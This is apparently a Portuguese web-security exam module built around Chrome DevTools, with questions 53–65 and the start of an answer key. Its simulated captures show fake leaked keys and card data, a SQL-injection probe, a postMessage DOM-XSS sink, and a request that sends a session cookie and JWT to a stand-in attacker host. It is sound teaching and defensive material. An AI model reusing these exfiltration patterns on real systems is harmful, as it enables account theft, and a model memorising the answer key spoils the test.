Durante uma análise técnica utilizando a aba **Network** do Chrome DevTools:
1. Explique todas as formas pelas quais um engenheiro comprova na aba **Network** (e no painel **Security**) que uma requisição utilizou **HTTPS** de forma íntegra, diferenciando o protocolo da aplicação (`http/1.1`, `h2`, `h3`) do esquema (`https`).
2. Defina o que é **TTFB** (*Time To First Byte*) e explique o significado de cada uma das fases exibidas no painel **Timing** de uma requisição: *Queueing*, *Stalled*, *DNS Lookup*, *Initial Connection*, *SSL*, *Request Sent*, *Waiting for server response (TTFB)* e *Content Download*.
3. Se um endpoint de busca apresenta subitamente um TTFB de `8.000 ms` enquanto os ativos estáticos da mesma origem têm TTFB de `15 ms`, quais hipóteses de **performance** e de **segurança** (como *Time-Based Blind SQL Injection* ou negação de serviço na aplicação) devem ser investigadas?

##### Questão 53 (Discursiva — Segurança em APIs REST: BOLA/IDOR, Excessive Data Exposure e Mass Assignment)
As falhas de controle de acesso e exposição de dados lideram o **OWASP Top 10** e o **OWASP API Security Top 10**. Considere uma API REST de comércio eletrônico com os endpoints `GET /api/v1/pedidos/9041` e `PUT /api/v1/clientes/42`.
1. Explique como ocorrem as vulnerabilidades **BOLA / IDOR** (*Broken Object Level Authorization* / *Insecure Direct Object Reference*), **Excessive Data Exposure** (*Exposição Excessiva de Dados*) e **Mass Assignment** (*Atribuição em Massa*) nesses endpoints.
2. Descreva passo a passo como um auditor autorizado identifica essas três vulnerabilidades utilizando a aba **Network** e a aba **Console** do Chrome DevTools.
3. Proponha a arquitetura de correção no back-end (incluindo verificação de propriedade do objeto vinculada à identidade da sessão no servidor, uso de DTOs — *Data Transfer Objects* — de entrada e de saída e identificadores não sequenciais como UUIDv4 como camada complementar).

##### Questão 54 (Discursiva — Arquitetura Segura de Redes Corporativas: CIDR, NAT, Firewall, Proxy Reverso, WAF e Portas)
Uma organização financeira vai implantar em produção seu portal web (`https://ib.financeira-ficticia.test`), composto por servidores web/aplicação Node.js (porta interna `8080`), banco de dados relacional PostgreSQL (porta `5432`) e acesso administrativo via SSH (porta `22`).
1. Projete a topologia de rede segmentada utilizando blocos privados da **RFC 1918** e notação **CIDR** (por exemplo, separando sub-rede de borda/DMZ, sub-rede de aplicação e sub-rede de banco de dados), calculando a máscara e o número de hosts de uma sub-rede `/27` para o banco de dados.
2. Explique o papel e as diferenças entre o **Proxy Reverso**, o **WAF** (*Web Application Firewall*), o **Firewall Stateful** de camada 3/4 e o **NAT** nessa arquitetura.
3. Indique exatamente quais portas TCP/UDP devem ficar expostas para a Internet pública e quais portas (`22`, `80`, `443`, `5432`, `8080`, etc.) devem ser restritas internamente ou acessadas apenas via **VPN** corporativa.

##### Questão 55 (Discursiva — Limitações da Auditoria pelo Navegador: Caixa-Preta no DevTools vs. Caixa-Branca no Servidor)
Um gestor de tecnologia afirmou que *"se inspecionarmos todas as páginas do nosso sistema com as abas Network, Application e Console do Chrome DevTools e não encontrarmos nenhum alerta, podemos garantir que o sistema está 100% seguro"*.
Analise criticamente essa afirmação:
1. Liste **cinco classes de problemas de segurança** que **podem** ser detectadas diretamente com alta precisão pelo Chrome DevTools.
2. Liste e explique **cinco classes de vulnerabilidades graves no servidor ou na infraestrutura** que são invisíveis ou impossíveis de descartar apenas olhando o navegador (auditoria *caixa-preta* passiva).
3. Explique como estruturar um programa completo de verificação de segurança combinando a inspeção no DevTools com **SAST** (*Static Application Security Testing*), **DAST** (*Dynamic Application Security Testing*), **SCA** (*Software Composition Analysis*), revisão de arquitetura e testes de intrusão (*Pentest*) autorizados.

---

<a id="s9-4"></a>
### 9.4 Questões Práticas de Interpretação do Chrome DevTools (Questões 56 a 65)

Analise cuidadosamente as capturas textuais das abas **Network**, **Application** e **Console** do Chrome DevTools apresentadas nas questões de **56 a 65** e responda a todos os itens solicitados. Confira posteriormente os diagnósticos completos no [Padrão de Resposta da Banca (Seção 9.5.7)](#s9-5-7).

##### Questão 56 (Prática DevTools — Aba Network: Análise de Fluxo de Autenticação e Redirecionamento)
Durante uma auditoria autorizada na aplicação `loja-ficticia.test`, você capturou na aba **Network** (com **Preserve log** ativado) a requisição e a resposta geradas quando o usuário clicou no botão "Entrar":

```http
=== ABA NETWORK > HEADERS (GENERAL) ===
Request URL: http://loja-ficticia.test/auth/login?email=ana.silva%40exemplo.test&senha=MinhaSenh@2026!&cpf=12345678900&next=http://sorteio-externo.test/resgate
Request Method: GET
Status Code: 302 Found
Remote Address: 203.0.113.45:80
Referrer Policy: unsafe-url

=== ABA NETWORK > RESPONSE HEADERS ===
HTTP/1.1 302 Found
Date: Fri, 30 Oct 2026 10:15:00 GMT
Server: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1
X-Powered-By: PHP/7.2.10
Set-Cookie: PHPSESSID=a1b2c3d4e5f60718293a; path=/
Location: http://sorteio-externo.test/resgate
Content-Type: text/html; charset=UTF-8
```

Com base exclusivamente nas evidências dessa captura da aba **Network**, faça um diagnóstico técnico completo:
1. Identifique **pelo menos 6 vulnerabilidades ou falhas graves de segurança** presentes nessa requisição e nessa resposta.
2. Explique como a combinação de `Referrer Policy: unsafe-url` com o redirecionamento para `http://sorteio-externo.test/resgate` amplifica o vazamento das credenciais enviadas na URL.
3. Reescreva como deveriam ser a requisição HTTP e os cabeçalhos da resposta HTTP após a correção completa de todos os problemas apontados.

##### Questão 57 (Prática DevTools — Aba Network: Exposição Excessiva de Dados no Payload JSON e Headers Ausentes)
Ao inspecionar o carregamento da página "Meus Pedidos" de um e-commerce na aba **Network**, você seleciona a requisição `GET /api/v1/pedidos/detalhe?id=402` e analisa as sub-abas **Headers** e **Response**:

```http
=== ABA NETWORK > HEADERS ===
Request URL: https://api.loja-ficticia.test/api/v1/pedidos/detalhe?id=402
Request Method: GET
Status Code: 200 OK
Protocol: h2

--- Response Headers ---
:status: 200
content-type: application/json; charset=utf-8
cache-control: public, max-age=86400
access-control-allow-origin: *
server: Microsoft-IIS/10.0
x-aspnet-version: 4.0.30319
```

```json
// === ABA NETWORK > RESPONSE (CORPO JSON) ===
{
  "pedido_id": 402,
  "status": "ENTREGUE",
  "valor_total": 349.90,
  "itens": [
    { "sku": "TEC-09", "titulo": "Teclado Mecânico", "preco": 349.90 }
  ],
  "comprador": {
    "usuario_id": 88,
    "nome": "Marcos Oliveira",
    "email": "marcos@exemplo.test",
    "cpf": "098.765.432-11",
    "senha_hash": "e10adc3949ba59abbe56e057f20f883e",
    "role": "customer",
    "cartao_credito_numero": "4532111122228899",
    "cartao_cvv": "412"
  },
  "config_interna_gateway": {
    "ambiente": "production",
    "chave_privada_api": "rk_live_99887766554433221100aabbcc"
  }
}
```

Sabendo que a interface visual da página HTML exibe apenas o número do pedido (`402`), o status (`ENTREGUE`), o título do produto (`Teclado Mecânico`) e o valor (`R$ 349,90`), responda:
1. Qual vulnerabilidade da API (OWASP API Security) está caracterizada no corpo JSON e quais dados críticos jamais deveriam ter sido serializados? Analise também o formato do `senha_hash` de 32 caracteres hexadecimais.
2. Qual é o impacto de segurança do cabeçalho `cache-control: public, max-age=86400` combinado a `access-control-allow-origin: *` nessa rota?
3. Que teste adicional você executaria no parâmetro `?id=402` em ambiente autorizado de laboratório para verificar a presença de **BOLA/IDOR**, e como corrigir o endpoint no back-end?

##### Questão 58 (Prática DevTools — Aba Network: Diagnóstico de Dois Cenários de CORS com Preflight `OPTIONS`)
Uma aplicação front-end hospedada em `https://app.painel-ficticio.test` executa a seguinte chamada JavaScript para uma API em `https://api.painel-ficticio.test`:

```javascript
fetch('https://api.painel-ficticio.test/v1/transferencia', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json', 'X-Client-Version': '2.4' },
  body: JSON.stringify({ destino: '9912-3', valor: 500 })
});
```

Analise os **dois cenários** registrados na aba **Network** e no **Console**:

```text
=== CENÁRIO A (Bloqueado pelo Navegador) ===
[Network] OPTIONS https://api.painel-ficticio.test/v1/transferencia -> Status: 204 No Content
  Request Headers:
    Origin: https://app.painel-ficticio.test
    Access-Control-Request-Method: POST
    Access-Control-Request-Headers: content-type, x-client-version
  Response Headers:
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Methods: POST, GET, OPTIONS
    Access-Control-Allow-Headers: content-type, x-client-version
    Access-Control-Allow-Credentials: true

[Console Error] Access to fetch at 'https://api.painel-ficticio.test/v1/transferencia' from origin 'https://app.painel-ficticio.test' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'.
```

```text
=== CENÁRIO B (Após "correção" ingênua do desenvolvedor, testada a partir de https://malicioso.exemplo.test) ===
[Network] POST https://api.painel-ficticio.test/v1/transferencia -> Status: 200 OK
  Request Headers:
    Origin: https://malicioso.exemplo.test
    Cookie: session_id=77a88b99c00d
  Response Headers:
    Access-Control-Allow-Origin: https://malicioso.exemplo.test
    Access-Control-Allow-Credentials: true
```

Responda:
1. Por que a requisição do `fetch` disparou obrigatoriamente uma requisição **Preflight (`OPTIONS`)** antes do `POST`?
2. Explique tecnicamente por que o **Cenário A** falhou no navegador e por que o **Cenário B** introduziu uma vulnerabilidade crítica de segurança.
3. Escreva os cabeçalhos HTTP de resposta exatos que o servidor `https://api.painel-ficticio.test` deve retornar para funcionar com segurança apenas para `https://app.painel-ficticio.test`.

##### Questão 59 (Prática DevTools — Aba Network: Interpretação de Colunas, Waterfall e Fases de Timing)
Observe a captura textual da tabela da aba **Network** e o detalhamento da sub-aba **Timing** da requisição `busca?filtro=notebooks` em `https://loja-ficticia.test`:

```text
=== ABA NETWORK — TABELA DE REQUISIÇÕES ===
Name                     Method Status Protocol Scheme Domain              Remote Address     Type   Initiator      Size               Time      Waterfall
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
index.html               GET    200    h2       https  loja-ficticia.test  198.51.100.10:443  document Other        14.2 kB / 52.0 kB  85 ms     [==]
app.bundle.js            GET    200    h2       https  loja-ficticia.test  198.51.100.10:443  script index.html:12  (disk cache)       2 ms      |
logo.svg                 GET    304    h2       https  loja-ficticia.test  198.51.100.10:443  svg    index.html:18  180 B / 18.4 kB    24 ms      [=]
busca?filtro=notebooks   GET    200    h2       https  loja-ficticia.test  198.51.100.10:443  fetch  app.bundle.js  1.1 kB / 2.4 kB    6240 ms    [====================]
```

```text
=== ABA NETWORK > TIMING (busca?filtro=notebooks) ===
Resource Scheduling
  Queueing:                                1.15 ms
Connection Start
  Stalled:                                 0.85 ms
  DNS Lookup:                              0 ms (Reused connection)
  Initial Connection:                      0 ms (Reused connection)
  SSL:                                     0 ms (Reused connection)
Request/Response
  Request Sent:                            0.30 ms
  Waiting for server response (TTFB):  6,236.20 ms
  Content Download:                        1.50 ms
Total:                                 6,240.00 ms
```

Responda:
1. Por que as fases `DNS Lookup`, `Initial Connection` e `SSL` da requisição `busca?filtro=notebooks` apresentaram tempo `0 ms`? Relacione com o protocolo exibido na coluna `Protocol`.
2. Explique a diferença de comportamento de cache entre `index.html` (`200`, `14.2 kB / 52.0 kB`), `app.bundle.js` (`200`, `(disk cache)`) e `logo.svg` (`304`, `180 B / 18.4 kB`), diferenciando também os dois valores presentes na coluna `Size` (`Transfer Size` vs. `Resource Size`).
3. Faça o diagnóstico completo do tempo de `6.240 ms` da requisição `busca?filtro=notebooks`: em qual etapa está o gargalo e o que pode explicá-lo tanto sob a ótica de performance quanto sob a ótica de um teste de segurança?

##### Questão 60 (Prática DevTools — Aba Application: Auditoria Completa da Tabela de Cookies)
Ao auditar a aba **Application > Storage > Cookies > `https://banco-ficticio.test`**, você encontra os seguintes **5 cookies** armazenados na tabela:

| Name | Value | Domain | Path | Expires / Max-Age | Size | HttpOnly | Secure | SameSite | Partition Key |
| :--- | :--- | :--- | :--- | :--- | :---: | :---: | :---: | :--- | :--- |
| `auth_session` | `f98a77b65c43d21e0099` | `.banco-ficticio.test` | `/` | `2027-10-30T10:00:00.000Z` | 32 | *(vazio)* | *(vazio)* | `None` | *(vazio)* |
| `__Host-token` | `9911aabbccddeeff` | `.banco-ficticio.test` | `/app` | `Session` | 28 | `✓` | *(vazio)* | `Lax` | *(vazio)* |
| `preferencia_ui`| `dark_mode` | `banco-ficticio.test` | `/` | `2027-01-01T00:00:00.000Z` | 24 | *(vazio)* | `✓` | `Lax` | *(vazio)* |
| `admin_flag` | `false` | `banco-ficticio.test` | `/` | `Session` | 15 | *(vazio)* | *(vazio)* | *(vazio)* | *(vazio)* |
| `chat_widget` | `cw_88210` | `.suporte-terceiro.test`| `/` | `2026-11-30T00:00:00.000Z` | 19 | `✓` | `✓` | `None` | `https://banco-ficticio.test` |

Analise tecnicamente cada linha da tabela e responda:
1. Quais são todas as falhas de segurança e de especificação presentes nos cookies **`auth_session`**, **`__Host-token`** e **`admin_flag`**? (Explique por que um navegador moderno rejeitará tanto `auth_session` quanto `__Host-token` da forma como o servidor tentou configurá-los).
2. Avalie se os cookies **`preferencia_ui`** e **`chat_widget`** estão configurados de forma adequada aos seus propósitos, explicando o significado da coluna **Partition Key** (`CHIPS`) no cookie `chat_widget`.
3. Escreva o cabeçalho HTTP `Set-Cookie` corrigido e endurecido para o cookie de sessão principal do banco.

##### Questão 61 (Prática DevTools — Aba Application: Local Storage e IndexedDB com JWT e Dados Sensíveis)
Inspecionando a aba **Application > Storage** do portal médico `https://clinica-ficticia.test`, você encontra os seguintes registros em **Local Storage** e **IndexedDB**:

```text
=== ABA APPLICATION > STORAGE > LOCAL STORAGE (https://clinica-ficticia.test) ===
Key                        Value
---------------------------------------------------------------------------------------------------------
jwt_token                  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MDIiLCJub21lIjoiRHJhLiBDbGFyYSIsInJvbGUiOiJtZWRpY28iLCJzZW5oYV9tZDUiOiI4MWRjOWJkYjUyZDA0ZGMy০০৩৬ZiZDgzaTllZDA1NSIsImV4cCI6MTk5OTk5OTk5OX0.X8k2mP9qR4vL1nZ7wY3cB5vN6mQ8jH2gF4dS0aP1oI
refresh_token              rt_live_998877665544332211_never_expires
lembrar_senha_texto_claro  Clinica@2026!
tema_interface             claro
```

```text
=== ABA APPLICATION > STORAGE > INDEXEDDB > ProntuariosDB > Object Store: pacientes_cache ===
Key (id)   Value (Object)
---------------------------------------------------------------------------------------------------------
1001       { cpf: "111.222.333-44", nome: "João Mendes", diagnostico_cid: "F41.1", cartao_sus: "8980011..." }
1002       { cpf: "555.666.777-88", nome: "Maria Souza", diagnostico_cid: "I10",   cartao_sus: "8980022..." }
```

Sabendo que a decodificação Base64URL do *payload* do `jwt_token` acima revela:
`{"sub":"402","nome":"Dra. Clara","role":"medico","senha_md5":"81dc9bdb52d04dc20036dbd8313ed055","exp":1999999999}`

Responda:
1. Aponte **todas as falhas de segurança** encontradas no `Local Storage`, dentro da estrutura do próprio `jwt_token` e no `IndexedDB`.
2. Qual dado do `Local Storage` é adequado para permanecer ali e como o restante da arquitetura de sessão e de consulta aos prontuários médicos deve ser redesenhado?

##### Questão 62 (Prática DevTools — Aba Application: Service Workers e Cache Storage Persistindo Dados após Logout)
Um usuário acessou sua conta em um computador público, consultou seu extrato financeiro e clicou em "Sair" (Logout). Em seguida, um auditor abriu a aba **Application** do Chrome DevTools nesse mesmo navegador e observou o seguinte estado:

```text
=== ABA APPLICATION > APPLICATION > SERVICE WORKERS ===
Source: https://carteira-ficticia.test/sw-cache-tudo.js
Status: #442 activated and is running
Clients: https://carteira-ficticia.test/login
[ ] Offline   [ ] Update on reload   [ ] Bypass for network

=== ABA APPLICATION > STORAGE > CACHE STORAGE > cache-v1 (https://carteira-ficticia.test) ===
Name                                        Response-Type  Content-Type      Content-Length  Status  Time Cached
-------------------------------------------------------------------------------------------------------------------------
/assets/main.8f9a2.css                      basic          text/css          45,120          200     10:02:11 GMT
/assets/bundle.3c1d4.js                     basic          application/js    182,400         200     10:02:11 GMT
/api/v1/conta/resumo-financeiro             basic          application/json  4,890           200     10:03:45 GMT
/api/v1/conta/chaves-pix-e-documentos       basic          application/json  3,120           200     10:04:10 GMT
```

Ao clicar sobre a linha `/api/v1/conta/resumo-financeiro` na sub-aba **Preview** do **Cache Storage**, o auditor consegue ler todo o saldo, histórico de transações e CPF do usuário anterior, embora a sessão já tenha sido encerrada.
Responda:
1. Por que esses dados sensíveis continuaram acessíveis no navegador após o logout e como o **Service Worker** contribuiu para essa vulnerabilidade?
2. Como o auditor pode utilizar os controles da tela **Service Workers** (*Bypass for network*, *Unregister*) e **Storage** (*Clear site data*) no DevTools para testar e validar o comportamento da aplicação?
3. Quais correções devem ser implementadas no código do `sw-cache-tudo.js`, nos cabeçalhos HTTP das rotas `/api/v1/conta/*` e no fluxo de logout do servidor?

##### Questão 63 (Prática DevTools — Aba Console: Violações de Content Security Policy — CSP, `eval()` e XSS)
Ao abrir a aba **Console** do Chrome DevTools durante o carregamento da página de detalhes de um produto (`https://loja-ficticia.test/produto/99`), você observa as **3 mensagens de erro** abaixo:

```text
=== ABA CONSOLE (Filter: All levels | Context: top) ===

[Erro 1]
Refused to load the script 'https://malicioso-tracker.test/roubo-sessao.js' because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-7a8b9c0d1e2f'". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.
  at comentario-render.js:28

[Erro 2]
Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-7a8b9c0d1e2f'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present.
  at produto/99:145 (<button onclick="adicionarCarrinho(99)">Comprar</button>)

[Erro 3]
Uncaught EvalError: Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script in the following Content Security Policy directive: "script-src 'self' 'nonce-7a8b9c0d1e2f'".
  at calcularParcelas (calculadora-preco.js:54:18)
```

Analise os três erros reportados pelo Console e responda:
1. O que o **`[Erro 1]`** revela sobre a existência de uma vulnerabilidade no código da página (`comentario-render.js:28`) e como o **CSP** agiu nesse caso?
2. Por que o **`[Erro 2]`** e o **`[Erro 3]`** ocorreram no código legítimo da loja?
3. Um desenvolvedor júnior sugeriu alterar o cabeçalho CSP para `script-src * 'unsafe-inline' 'unsafe-eval'` para "sumir com os três erros do Console". Explique por que essa sugestão é desastrosa e indique como corrigir o código de `comentario-render.js`, do botão HTML na linha `145` e da função `calcularParcelas` em `calculadora-preco.js` sem enfraquecer o CSP.

##### Questão 64 (Prática DevTools — Aba Console: Vazamento em `console.log`, Stack Trace de SQL Injection e Validação Front-End)
Durante um teste de segurança autorizado na página de checkout (`https://loja-ficticia.test/checkout`), você abre a aba **Console** e observa a saída abaixo após digitar `PROMO10'` no campo de cupom de desconto:

```text
=== ABA CONSOLE ===
[Log]   [Checkout Init] Ambiente carregado. Chave de API Pagamentos: sk_live_51N9xYzAbCdEfGhIjKlMnOpQrStUvWxYz (checkout.js:14)
[Log]   [Auth Debug] Usuário atual: { id: 309, email: "cliente@exemplo.test", isVIP: false, token_interno: "adm_secret_8812" } (checkout.js:29)
[Warn]  Validação de desconto VIP executada no cliente: window.permitirDescontoVIP === false (checkout.js:88)
[Error] POST https://loja-ficticia.test/api/v1/cupons/validar 500 (Internal Server Error) (checkout.js:112)
[Error] Uncaught (in promise) Error: Falha no servidor:
        org.postgresql.util.PSQLException: ERROR: syntax error at or near "'PROMO10''"
        Position: 64
        SQL: SELECT id, percentual, ativo FROM tb_cupons_desconto WHERE codigo = 'PROMO10'' AND ativo = true;
        at br.com.lojaficticia.dao.CupomDAO.buscarPorCodigo(CupomDAO.java:77)
        at br.com.lojaficticia.controller.CupomController.validar(CupomController.java:41)
```

Inspecionando o arquivo `checkout.js:88`, você nota ainda que o botão de "Aplicar 50% de Desconto VIP" faz apenas `if (window.permitirDescontoVIP) { enviarPedidoComPreco(precoTotal * 0.5); }`.
Responda:
1. Identifique e classifique **todas as 4 vulnerabilidades graves** evidenciadas nessa captura da aba **Console**.
2. Como um usuário mal-intencionado poderia usar o próprio **REPL interativo da aba Console** para explorar a falha da linha `88` (`window.permitirDescontoVIP`) e como explorar (em laboratório autorizado) a falha revelada na linha `112`?
3. Detalhe o plano completo de correção no front-end e no back-end para eliminar todas as falhas.

##### Questão 65 (Prática DevTools — Diagnóstico Forense Integrado nas 3 Abas: Network + Application + Console)
Um analista de resposta a incidentes investiga uma suspeita de sequestro de contas na aplicação `https://portal.empresa-ficticia.test`. Ao abrir o Chrome DevTools e correlacionar simultaneamente as abas **Console**, **Application** e **Network**, ele coleta as três evidências abaixo:

```text
=== EVIDÊNCIA 1: ABA CONSOLE E CÓDIGO FONTE (notificacoes-widget.js:19) ===
// Código do widget na página principal:
window.addEventListener('message', function(event) {
  // Sem verificação de event.origin!
  const container = document.getElementById('aviso-sistema');
  container.innerHTML = event.data.htmlMensagem;
});

[Console Warning] Cookie “SESSION_PORTAL” does not have a proper “SameSite” attribute value...
```

```text
=== EVIDÊNCIA 2: ABA APPLICATION ===
> Cookies (https://portal.empresa-ficticia.test):
  Name: SESSION_PORTAL | Value: 44a55b66c77d88e99f | HttpOnly: (vazio) | Secure: ✓ | SameSite: None
> Local Storage (https://portal.empresa-ficticia.test):
  Key: api_bearer_jwt  | Value: eyJhbGciOiJIUzI1NiIs...
```

```text
=== EVIDÊNCIA 3: ABA NETWORK ===
Name                                                        Method  Status  Type   Initiator
--------------------------------------------------------------------------------------------------------------
coletor?c=SESSION_PORTAL%3D44a55b66c77d88e99f&j=eyJhbG...   GET     200     fetch  notificacoes-widget.js:21
  Request URL: https://telemetria-externa-suspeita.test/coletor?c=SESSION_PORTAL%3D44a55b66c77d88e99f&j=eyJhbG...
```

Reconstrua a cadeia completa do ataque (*Kill Chain*) e proponha a remediação:
1. Explique passo a passo como o atacante explorou o `window.addEventListener('message', ...)` (**Evidência 1**) para alcançar **DOM-Based XSS**, como ele extraiu as credenciais da **Evidência 2** e como a **Evidência 3** (incluindo a coluna `Initiator`) comprova a exfiltração.
2. Quais são as **5 medidas de correção e defesa em profundidade** (no código JS do `postMessage` e do DOM, nos atributos do cookie, no armazenamento do token e nos cabeçalhos HTTP `Content-Security-Policy` — diretiva `connect-src`) que teriam impedido ou contido esse incidente?


---

<a id="s9-5"></a>
### 9.5 Gabarito Oficial e Resolução Comentada (Questões 1 a 65)

Esta subseção apresenta primeiramente a **Tabela de Respostas Rápidas** para conferência imediata das questões objetivas (`1` a `45`) e, na sequência, a **resolução técnica comentada alternativa por alternativa** para todas as questões de múltipla escolha (`1` a `30`), a justificativa de cada item de verdadeiro ou falso (`31` a `45`) e o **Padrão de Resposta Completo da Banca** para as questões discursivas (`46` a `55`) e práticas do Chrome DevTools (`56` a `65`).

<a id="s9-5-1"></a>
#### 9.5.1 Tabela de Respostas Rápidas (Questões 1 a 45)

| Nível Básico (1–10) | Nível Intermediário (11–20) | Nível Avançado (21–30) | Verdadeiro ou Falso (31–40) | Verdadeiro ou Falso (41–45) |
| :--- | :--- | :--- | :--- | :--- |
| **Q01:** `B` | **Q11:** `B` | **Q21:** `C` | **Q31:** `(V)` | **Q41:** `(V)` |
| **Q02:** `C` | **Q12:** `A` | **Q22:** `A` | **Q32:** `(F)` | **Q42:** `(V)` |
| **Q03:** `A` | **Q13:** `D` | **Q23:** `D` | **Q33:** `(V)` | **Q43:** `(F)` |
| **Q04:** `D` | **Q14:** `C` | **Q24:** `B` | **Q34:** `(F)` | **Q44:** `(V)` |
| **Q05:** `E` | **Q15:** `E` | **Q25:** `E` | **Q35:** `(F)` | **Q45:** `(F)` |
| **Q06:** `B` | **Q16:** `A` | **Q26:** `B` | **Q36:** `(V)` | — |
| **Q07:** `C` | **Q17:** `C` | **Q27:** `D` | **Q37:** `(F)` | — |
| **Q08:** `A` | **Q18:** `B` | **Q28:** `A` | **Q38:** `(V)` | — |
| **Q09:** `D` | **Q19:** `D` | **Q29:** `C` | **Q39:** `(F)` | — |
| **Q10:** `E` | **Q20:** `E` | **Q30:** `E` | **Q40:** `(V)` | — |

---

<a id="s9-5-2"></a>
#### 9.5.2 Resolução Comentada: Múltipla Escolha — Nível Básico (Questões 1 a 10)

##### Resolução da Questão 1 — Gabarito: `B`
- **Por que a `B` está correta:** Segundo a **RFC 9110 (Seção 15.3.1)**, o código de status `200 OK` indica que a requisição foi bem-sucedida. O significado exato do payload de resposta depende do método HTTP utilizado: em uma requisição `GET`, o corpo da resposta traz a representação atual do recurso alvo; em um `POST`, traz uma representação descrevendo o resultado da ação executada (consulte a [Seção 1.5](./01a-fundamentos-web-parte1.md#s1-5)).
- **Análise das incorretas:**
  - `A`: O redirecionamento para reutilização de cache local após validação condicional corresponde ao código `304 Not Modified`, e não ao `200 OK`.
  - `C`: A criação confirmada de um novo recurso com cabeçalho `Location` apontando para o identificador recém-criado é a semântica específica do código `201 Created`.
  - `D`: O status HTTP reflete o processamento na camada de aplicação (Camada 7), e não apenas o handshake TCP na camada de transporte.
  - `E`: O código que proíbe explicitamente o envio de corpo de mensagem na resposta é o `204 No Content` (e o `304 Not Modified`).

##### Resolução da Questão 2 — Gabarito: `C`
- **Por que a `C` está correta:** Na aba **Network** do Chrome DevTools ([Seção 2.1](./02a-devtools-network.md#s2-1)), uma requisição HTTPS é identificada de forma inequívoca por: (1) coluna `Scheme` igual a `https` e URL iniciada por `https://`; (2) coluna `Remote Address` conectada à porta padrão `:443` (ou porta TLS configurada); (3) presença da barra **SSL** (que representa o *handshake* TLS) no painel **Timing** da primeira requisição daquela conexão; e (4) inspeção da aba **Security** do DevTools confirmando a versão do TLS (ex.: `TLS 1.3`), a cifra AEAD e a cadeia de certificação X.509 válida.
- **Análise das incorretas:**
  - `A` e `B`: Códigos `200`, método `POST`, `Cache-Control: private` ou tipo `fetch` ocorrem igualmente em conexões HTTP não criptografadas (`http://`).
  - `D`: O protocolo em HTTPS geralmente é `h2` (HTTP/2) ou `h3` (HTTP/3), embora possa ser `http/1.1`, e o `User-Agent` não indica criptografia de transporte.
  - `E`: `(memory cache)` indica apenas que o recurso foi lido da memória RAM sem ir à rede.

##### Resolução da Questão 3 — Gabarito: `A`
- **Por que a `A` está correta:** Apesar do nome histórico `Unauthorized` na especificação HTTP (RFC 9110, Seção 15.5.2), o código **`401 Unauthorized`** refere-se estritamente à falta de **autenticação** válida (*"Quem é você?"*), exigindo que o servidor inclua o cabeçalho `WWW-Authenticate` informando como se autenticar. Já o código **`403 Forbidden`** (Seção 15.5.4) refere-se à falta de **autorização** (*"Eu sei quem você é, mas você não tem permissão para acessar este recurso"*); repetir a requisição com as mesmas credenciais continuará resultando em `403`.
- **Análise das incorretas:**
  - `B`: Excesso de requisições (*rate limiting*) corresponde ao código `429 Too Many Requests`.
  - `C`: Inverte completamente os conceitos de autenticação (`401`) e autorização (`403`) — pegadinha clássica de provas.
  - `D`: Recurso não encontrado é `404 Not Found` e método não suportado pela rota é `405 Method Not Allowed`.
  - `E`: Ambos possuem semânticas normativas estritas na RFC 9110, independentemente da tecnologia de servidor utilizada.

##### Resolução da Questão 4 — Gabarito: `D`
- **Por que a `D` está correta:** Ambos pertencem à *Web Storage API* ([Seção 1.12](./01b-fundamentos-web-parte2.md#s1-12) e [Seção 2.2.3](./02b-devtools-application.md#s2-2-3)) e respeitam a *Same-Origin Policy* (SOP), armazenando pares chave-valor em string (tipicamente ~5 MB por origem). A diferença crucial reside na **persistência** e no **escopo de contexto de navegação**: o `localStorage` é persistente em disco (não expira ao fechar a aba ou o navegador) e é compartilhado entre todas as abas/janelas abertas da mesma origem; já o `sessionStorage` é atrelado ao *top-level browsing context* (a aba específica) e é destruído imediatamente quando aquela aba é fechada.
- **Análise das incorretas:**
  - `A`: Nenhum mecanismo de Web Storage (`localStorage` ou `sessionStorage`) é enviado automaticamente pelo navegador em cabeçalhos HTTP; esse comportamento é exclusivo dos **Cookies**.
  - `B`: Tanto `localStorage` quanto `sessionStorage` são diretamente acessíveis por JavaScript e igualmente vulneráveis à leitura via XSS.
  - `C`: Armazenamento assíncrono estruturado de grande capacidade é característica do **IndexedDB**.
  - `E`: Ambos são estritamente isolados por origem (`esquema + host + porta`) pela SOP.

##### Resolução da Questão 5 — Gabarito: `E`
- **Por que a `E` está correta:** O status **`500 Internal Server Error`** (RFC 9110, Seção 15.6.1) é um código genérico da classe `5xx` indicando que o servidor encontrou uma condição inesperada (exceção não capturada, erro de sintaxe SQL, falha de ponteiro nulo, erro de configuração interna) que o impediu de atender à requisição. Em segurança da informação ([Seção 1.5.2](./01a-fundamentos-web-parte1.md#s1-5) e [Seção 3.7](./03a-vulnerabilidades-parte1.md#s3-7)), quando o modo *debug* permanece ativo em produção, respostas `500` frequentemente vazam *stack traces* completos, nomes de tabelas, versões de frameworks e caminhos de arquivos, auxiliando o atacante a calibrar ataques de *SQL Injection* ou *Path Traversal*. **[REQUISITO]**: Em produção, o servidor deve registrar o erro detalhado apenas nos logs internos seguros e retornar ao cliente uma mensagem genérica padronizada com um identificador de correlação (`trace_id`).
- **Análise das incorretas:**
  - `A`: JSON malformado enviado pelo cliente é erro do cliente (`400 Bad Request`).
  - `B`: Timeout em proxy reverso/gateway ao aguardar o servidor de origem corresponde ao status `504 Gateway Timeout` (e endereços MAC de camada 2 jamais atravessam roteadores na Internet).
  - `C` e `D`: O status `500` vem do servidor de aplicação e não desativa HTTPS nem representa bloqueio local de CORS.

##### Resolução da Questão 6 — Gabarito: `B`
